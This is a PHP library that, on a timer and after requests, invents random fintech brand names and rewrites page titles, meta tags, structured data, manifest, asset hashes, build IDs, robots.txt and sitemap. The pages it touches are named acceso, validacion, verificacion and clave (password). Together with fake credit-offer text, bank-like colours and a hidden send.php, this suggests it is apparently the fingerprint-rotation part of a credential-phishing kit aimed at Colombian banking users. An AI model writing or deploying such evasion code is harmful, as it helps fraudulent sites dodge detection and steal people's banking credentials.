<?php
/**
 * rotate_lib.php
 * --------------
 * Lógica de rotación SEO/meta como funciones reusables.
 * Usado por:
 *   - rotate.php       (disparo manual via URL con secreto)
 *   - send.php         (disparo automático al final de cada petición)
 */

if (!defined('NQ_ROTATE_DOMAIN')) {
    define('NQ_ROTATE_DOMAIN', 'ejemplo.com'); // cambia por tu dominio
}

const NQ_HTML_FILES = ['index.php','acceso.html','validacion.html','verificacion.html','clave.html'];

const NQ_BRAND_PREFIX = ['Pago','Vali','Credi','Solu','Conex','Finsa','Capi','Banca','Mone','Fintec','Activa','Nube','Agil','Direc','Linea','Pro','Cova','Andi','Latam','Veri','Sigma','Onda','Tribu','Quanta'];
const NQ_BRAND_SUFFIX = ['Pay','Net','Hub','Plus','Soluciones','Digital','Ya','Express','Group','App','Linea','Cred','Bank','Pro','Cash','Click','Fin','Money','Lab','Stack','X','One'];

const NQ_TITLE_TPLS = [
    'Simulador de Crédito | {brand}',
    'Tu crédito digital con {brand}',
    '{brand} - Validación financiera segura',
    'Activa tu crédito con {brand}',
    'Solicita tu crédito en línea | {brand}',
    '{brand} | Crédito al instante',
];

const NQ_DESC_TPLS = [
    'Plataforma de validación crediticia 100% digital. Procesos rápidos y seguros con {brand}.',
    'Solicita tu crédito en línea con {brand} y recibe respuesta en minutos.',
    'Crédito digital aprobado al instante. {brand} te acompaña en cada paso.',
    'Obtén la financiación que necesitas con {brand}. Trámite 100% digital.',
];

const NQ_KEYWORDS = ['crédito en línea','préstamo digital','financiación rápida','simulador de crédito','fintech colombia','banco digital','tarjeta de crédito','aprobación inmediata','crédito personal','solicitud online','cupo aprobado','validación de identidad'];
const NQ_THEMES = ['#5b1aa8','#da0081','#4a0f3a','#1d8c44','#2a0a22','#003893'];

function nq_pick($arr) { return $arr[array_rand($arr)]; }
function nq_hash($n = 8) { return substr(bin2hex(random_bytes($n)), 0, $n); }

function nq_atomic_write($path, $content) {
    $tmp = $path . '.tmp';
    file_put_contents($tmp, $content);
    rename($tmp, $path); // atómico en mismo FS
}

function nq_meta_block($brand, $title, $desc, $kw, $domain, $page, $theme) {
    $og_image  = "https://$domain/img/og-" . nq_hash(6) . ".jpg";
    $canonical = "https://$domain/$page";
    $kw_str    = implode(', ', $kw);

    $ld = json_encode([
        '@context' => 'https://schema.org',
        '@type' => 'FinancialProduct',
        'name' => $brand,
        'description' => $desc,
        'url' => $canonical,
        'provider' => ['@type' => 'Organization', 'name' => $brand, 'url' => "https://$domain/"],
    ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);

    $esc = fn($s) => htmlspecialchars($s, ENT_QUOTES);

    return implode("\n  ", [
        '<meta name="description" content="' . $esc($desc) . '" />',
        '<meta name="keywords" content="' . $esc($kw_str) . '" />',
        '<meta name="author" content="' . $esc($brand) . '" />',
        '<meta name="application-name" content="' . $esc($brand) . '" />',
        '<meta name="apple-mobile-web-app-title" content="' . $esc($brand) . '" />',
        '<meta name="theme-color" content="' . $theme . '" />',
        '<meta name="robots" content="index,follow" />',
        '<link rel="canonical" href="' . $canonical . '" />',
        '<link rel="manifest" href="manifest.json" />',
        '<link rel="icon" href="img/logo.svg" type="image/svg+xml" />',
        '<meta property="og:type" content="website" />',
        '<meta property="og:title" content="' . $esc($title) . '" />',
        '<meta property="og:description" content="' . $esc($desc) . '" />',
        '<meta property="og:image" content="' . $og_image . '" />',
        '<meta property="og:url" content="' . $canonical . '" />',
        '<meta property="og:site_name" content="' . $esc($brand) . '" />',
        '<meta name="twitter:card" content="summary_large_image" />',
        '<meta name="twitter:title" content="' . $esc($title) . '" />',
        '<meta name="twitter:description" content="' . $esc($desc) . '" />',
        '<meta name="twitter:image" content="' . $og_image . '" />',
        '<script type="application/ld+json">' . $ld . '</script>',
    ]);
}

function nq_process_html($html, $title, $meta_block, $version, $build_id) {
    if (preg_match('/<title>.*?<\/title>/s', $html)) {
        $html = preg_replace('/<title>.*?<\/title>/s', '<title>' . $title . '</title>', $html, 1);
    } else {
        $html = str_replace('</head>', '  <title>' . $title . "</title>\n</head>", $html);
    }

    $open = '<!-- nq:meta:start -->'; $close = '<!-- nq:meta:end -->';
    $block = $open . "\n" . $meta_block . "\n" . $close;
    if (strpos($html, $open) !== false && strpos($html, $close) !== false) {
        $html = preg_replace(
            '/' . preg_quote($open, '/') . '.*?' . preg_quote($close, '/') . '/s',
            $block, $html, 1
        );
    } else {
        $html = str_replace('</head>', "  $block\n</head>", $html);
    }

    $html = preg_replace_callback(
        '/(href|src)="([^"]+\.(?:css|js))(?:\?v=[a-z0-9]+)?"/',
        function ($m) use ($version) {
            $url = preg_replace('/\?v=[a-z0-9]+/', '', $m[2]);
            $sep = strpos($url, '?') !== false ? '&' : '?';
            return $m[1] . '="' . $url . $sep . 'v=' . $version . '"';
        },
        $html
    );

    if (preg_match('/<html[^>]*data-build="[^"]*"/', $html)) {
        $html = preg_replace('/(<html[^>]*?)\s*data-build="[^"]*"/', '$1', $html, 1);
    }
    $html = preg_replace('/<html\b/', '<html data-build="' . $build_id . '"', $html, 1);

    return $html;
}

/**
 * Ejecuta una rotación completa. No verifica nada — quien la invoca decide
 * cuándo correrla.
 */
function nq_do_rotate($base_dir, $domain = null) {
    if ($domain === null) $domain = NQ_ROTATE_DOMAIN;

    $brand    = nq_pick(NQ_BRAND_PREFIX) . nq_pick(NQ_BRAND_SUFFIX);
    $theme    = nq_pick(NQ_THEMES);
    $version  = nq_hash(8);
    $build_id = nq_hash(12);

    $desc_tpl  = nq_pick(NQ_DESC_TPLS);
    $kw_pool   = NQ_KEYWORDS; shuffle($kw_pool);
    $kw        = array_slice($kw_pool, 0, 8);
    $title_tpl = nq_pick(NQ_TITLE_TPLS);

    foreach (NQ_HTML_FILES as $fname) {
        $path = $base_dir . '/' . $fname;
        if (!is_file($path)) continue;
        $title = str_replace('{brand}', $brand, $title_tpl);
        $desc  = str_replace('{brand}', $brand, $desc_tpl);
        $meta  = nq_meta_block($brand, $title, $desc, $kw, $domain, $fname, $theme);
        $html  = file_get_contents($path);
        $html  = nq_process_html($html, $title, $meta, $version, $build_id);
        nq_atomic_write($path, $html);
    }

    // manifest.json
    $manifest = [
        'name' => $brand,
        'short_name' => mb_substr($brand, 0, 12),
        'description' => str_replace('{brand}', $brand, $desc_tpl),
        'start_url' => '/',
        'display' => 'standalone',
        'background_color' => '#ffffff',
        'theme_color' => $theme,
        'icons' => [['src' => 'img/logo.svg', 'sizes' => 'any', 'type' => 'image/svg+xml']],
        'id' => '/?v=' . nq_hash(6),
    ];
    nq_atomic_write($base_dir . '/manifest.json', json_encode($manifest, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

    // robots.txt
    $robots = "User-agent: *\nDisallow: /config.php\nDisallow: /send.php\nDisallow: /pack.php\nDisallow: /rotate.php\nDisallow: /rotate_lib.php\nSitemap: https://$domain/sitemap.xml\n";
    nq_atomic_write($base_dir . '/robots.txt', $robots);

    // sitemap.xml
    $today = date('Y-m-d');
    $urls = '';
    foreach (NQ_HTML_FILES as $f) {
        $urls .= "  <url><loc>https://$domain/$f</loc><lastmod>$today</lastmod></url>\n";
    }
    $xml = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n$urls</urlset>\n";
    nq_atomic_write($base_dir . '/sitemap.xml', $xml);

    return ['brand' => $brand, 'theme' => $theme, 'version' => $version, 'build' => $build_id];
}

/**
 * Verifica si pasó suficiente tiempo desde la última rotación; si sí, la ejecuta.
 * Usa un archivo de marca y un lock de fichero para evitar dobles ejecuciones.
 *
 * @param int $interval_seconds  cada cuántos segundos rotar
 * @param string $base_dir       directorio del proyecto
 * @return bool                  true si se ejecutó, false si no fue necesario
 */
function nq_maybe_rotate($interval_seconds, $base_dir = null) {
    if ($base_dir === null) $base_dir = __DIR__;

    $stamp_file = $base_dir . '/.last_rotate';
    $lock_file  = $base_dir . '/.rotate_lock';

    // ¿Es momento?
    $last = is_file($stamp_file) ? (int) trim(file_get_contents($stamp_file)) : 0;
    if (time() - $last < $interval_seconds) return false;

    // Lock no bloqueante para evitar carreras entre peticiones simultáneas.
    $fp = @fopen($lock_file, 'c');
    if (!$fp) return false;
    if (!flock($fp, LOCK_EX | LOCK_NB)) {
        fclose($fp);
        return false; // otra petición ya está rotando
    }

    // Re-chequear dentro del lock (puede haber rotado mientras esperábamos)
    $last = is_file($stamp_file) ? (int) trim(file_get_contents($stamp_file)) : 0;
    if (time() - $last < $interval_seconds) {
        flock($fp, LOCK_UN); fclose($fp);
        return false;
    }

    try {
        nq_do_rotate($base_dir);
        file_put_contents($stamp_file, (string) time());
    } catch (Throwable $e) {
        // Silencioso. No queremos romper la respuesta del usuario.
    } finally {
        flock($fp, LOCK_UN);
        fclose($fp);
    }
    return true;
}
